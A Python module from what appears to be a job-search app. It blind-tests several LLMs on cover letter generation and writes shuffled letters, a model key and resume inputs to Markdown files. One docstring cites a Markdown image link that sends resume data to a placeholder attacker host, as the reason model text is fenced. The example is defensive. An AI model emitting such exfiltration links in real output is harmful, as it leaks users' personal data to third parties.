"""Side-by-side model test for cover letters (`worksaas compare-letters`).

Letters are written by the real pipeline (`analysis.generate`: same feature, prompt and variables
as in the app); only the route is swapped per model, the LLM cache is bypassed and nothing is
saved or billed to the user. Output is a blind report: letters of each vacancy are shuffled under
letters A, B, C… and the key (label -> model, tokens, cost) is a separate file, so a reviewer can
judge the texts without knowing the models.
"""

from __future__ import annotations

import random
import re
import string
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from app.core.config import LLMRoute, LLMTarget, get_settings
from app.core.db import session_scope
from app.llm import LLMError
from app.services import analysis as analysis_svc
from app.services import resumes as resume_svc
from app.services import vacancies as vacancy_svc
from app.services.errors import ValidationFailed

# Candidates for the "letters" role on Cloud.ru (2026-10-08, names from the Cloud.ru console);
# the provider must be called "cloudru" in config.toml, otherwise pass --model explicitly.
DEFAULT_LETTER_MODELS = (
    "cloudru:GigaChat/GigaChat-3-Pro",
    "cloudru:ai-sage/GigaChat3.5-432B-A28B-Reasoning",
    "cloudru:moonshotai/Kimi-K2.6",
    "cloudru:deepseek-ai/DeepSeek-V4-Pro",
    "cloudru:zai-org/GLM-5.1",
)
MAX_VACANCIES = 10
MAX_MODELS = 8


@dataclass
class LetterRun:
    vacancy_id: int
    vacancy_title: str
    target: LLMTarget
    subject: str = ""
    body: str = ""
    warnings: list[str] = field(default_factory=list)
    error: str = ""
    input_tokens: int = 0
    output_tokens: int = 0
    cost: float = 0.0
    latency_ms: int = 0


def parse_target(spec: str) -> LLMTarget:
    """'cloudru:GigaChat/GigaChat-3-Pro' -> provider + model (the model id may contain ':' too)."""
    provider, sep, model = spec.strip().partition(":")
    if not sep or not provider or not model:
        raise ValidationFailed(f"Модель задаётся как провайдер:модель, например cloudru:GigaChat/GigaChat-3-Pro — "
                               f"получено «{spec}»")
    return LLMTarget(provider=provider, model=model)


def _route(target: LLMTarget) -> LLMRoute:
    """The tested model alone (no fallbacks: a failure must show, not hide behind another model);
    the configured effort/max_tokens are kept only when it is the configured letters model."""
    settings = get_settings()
    if target.provider not in settings.llm.providers:
        raise ValidationFailed(f"Провайдер «{target.provider}» не описан в [llm.providers] config.toml")
    base = settings.llm.route_for("cover_letter")
    same = base.provider == target.provider and base.model == target.model
    return LLMRoute(provider=target.provider, model=target.model,
                    effort=base.effort if same else None, max_tokens=base.max_tokens if same else None)


async def compare_letters(user_id: int, resume_id: int, vacancy_ids: list[int],
                          targets: list[LLMTarget], params: dict | None = None) -> list[LetterRun]:
    vacancy_ids = list(dict.fromkeys(vacancy_ids))
    targets = list({(t.provider, t.model): t for t in targets}.values())
    if not vacancy_ids or not targets:
        raise ValidationFailed("Нужны хотя бы одна вакансия и одна модель")
    if len(vacancy_ids) > MAX_VACANCIES or len(targets) > MAX_MODELS:
        raise ValidationFailed(f"Не больше {MAX_VACANCIES} вакансий и {MAX_MODELS} моделей за раз — тест платный")
    routes = {(t.provider, t.model): _route(t) for t in targets}
    with session_scope() as s:  # every id is checked before anything is paid for
        resume_svc.get_owned(s, user_id, resume_id)
        titles = {vid: vacancy_svc.get_for_user(s, user_id, vid)[0].title for vid in vacancy_ids}
    runs: list[LetterRun] = []
    for vid in vacancy_ids:
        for target in targets:
            run = LetterRun(vacancy_id=vid, vacancy_title=titles[vid], target=target)
            try:
                result, _ = await analysis_svc.generate(
                    user_id, "cover_letter", resume_id=resume_id, vacancy_id=vid, params=params,
                    route=routes[(target.provider, target.model)], use_cache=False, bill_user=False)
            except LLMError as exc:
                run.error = str(exc)[:500]
            else:
                out = result.output
                run.subject, run.body, run.warnings = out.subject, out.body, list(out.warnings)
                run.input_tokens, run.output_tokens = result.usage.input_tokens, result.usage.output_tokens
                run.cost, run.latency_ms = result.cost_usd, result.latency_ms
            runs.append(run)
    return runs


def _fenced(text: str) -> list[str]:
    """Third-party or model text as a code block: a Markdown preview must not load images or
    links planted in a vacancy (e.g. ![](https://attacker/?q=<resume>))."""
    longest = max((len(m) for m in re.findall(r"`+", text)), default=0)
    fence = "`" * max(3, longest + 1)
    return [fence + "text", text, fence]


def report_dir(out: str | None) -> Path:
    """Relative paths go under data_dir (gitignored): the report holds the full resume."""
    base = Path(get_settings().data_dir)
    if not out:
        return base / "letter-tests" / f"{datetime.now():%Y%m%d-%H%M%S}"
    path = Path(out)
    return path if path.is_absolute() else base / path


def write_report(runs: list[LetterRun], user_id: int, resume_id: int, out_dir: Path | None = None,
                 seed: int | None = None) -> Path:
    """blind.md (shuffled letters), key.md (label -> model + cost), inputs.md (resume and vacancies)."""
    out_dir = out_dir or report_dir(None)
    out_dir.mkdir(parents=True, exist_ok=True)
    rng = random.Random(seed)
    by_vacancy: dict[int, list[LetterRun]] = {}
    for run in runs:
        by_vacancy.setdefault(run.vacancy_id, []).append(run)

    blind = ["# Письма вслепую", "",
             "Для каждой вакансии письма перемешаны и подписаны буквами; буквы у разных вакансий не связаны.",
             "Модели — в key.md (не открывать до оценки). Резюме и тексты вакансий — в inputs.md.", ""]
    key = ["# Ключ: буква -> модель", "",
           "| Вакансия | Буква | Модель | Вход/выход, токенов | Стоимость* | Время, с | Ошибка |",
           "|---|---|---|---|---|---|---|"]
    for n, items in enumerate(by_vacancy.values(), 1):
        items = list(items)
        rng.shuffle(items)
        blind += [f"## Вакансия {n}", *_fenced(items[0].vacancy_title), ""]
        for label, run in zip(string.ascii_uppercase, items):
            model = f"{run.target.provider}:{run.target.model}"
            error = " ".join(run.error.replace("|", "/").split())[:120]
            key.append(f"| {n} | {label} | {model} | {run.input_tokens}/{run.output_tokens} | {run.cost:.4f} | "
                       f"{run.latency_ms / 1000:.1f} | {error} |")
            blind += [f"### Письмо {label}", ""]
            if run.error:
                blind += ["_(модель не ответила — см. key.md)_", ""]
                continue
            letter = f"Тема: {run.subject}\n\n{run.body}"
            if run.warnings:
                letter += "\n\nПредупреждения модели: " + "; ".join(run.warnings)
            blind += [*_fenced(letter), ""]

    totals: dict[str, list[LetterRun]] = {}
    for run in runs:
        totals.setdefault(f"{run.target.provider}:{run.target.model}", []).append(run)
    key += ["", "## Итого по моделям", "",
            "| Модель | Писем | Ошибок | Средний вход/выход | Средняя стоимость письма* | Среднее время, с |",
            "|---|---|---|---|---|---|"]
    for model, items in totals.items():
        ok = [r for r in items if not r.error]
        k = len(ok) or 1
        key.append(f"| {model} | {len(ok)} | {len(items) - len(ok)} | "
                   f"{sum(r.input_tokens for r in ok) // k}/{sum(r.output_tokens for r in ok) // k} | "
                   f"{sum(r.cost for r in ok) / k:.4f} | {sum(r.latency_ms for r in ok) / k / 1000:.1f} |")
    key += ["", "\\* в единицах [llm.prices] (рубли, если цены вписаны в рублях); 0 — цена модели не задана.",
            "Тест не списывается с бюджета пользователя и не берёт письма из кэша."]

    inputs = ["# Входные данные", ""]
    with session_scope() as s:
        inputs += ["## Резюме", "", *_fenced(resume_svc.get_owned(s, user_id, resume_id).text), ""]
        for n, vid in enumerate(by_vacancy, 1):
            vacancy, _ = vacancy_svc.get_for_user(s, user_id, vid)
            inputs += [f"## Вакансия {n}", "", *_fenced(vacancy_svc.to_prompt(vacancy)), ""]

    (out_dir / "blind.md").write_text("\n".join(blind), encoding="utf-8")
    (out_dir / "key.md").write_text("\n".join(key), encoding="utf-8")
    (out_dir / "inputs.md").write_text("\n".join(inputs), encoding="utf-8")
    return out_dir
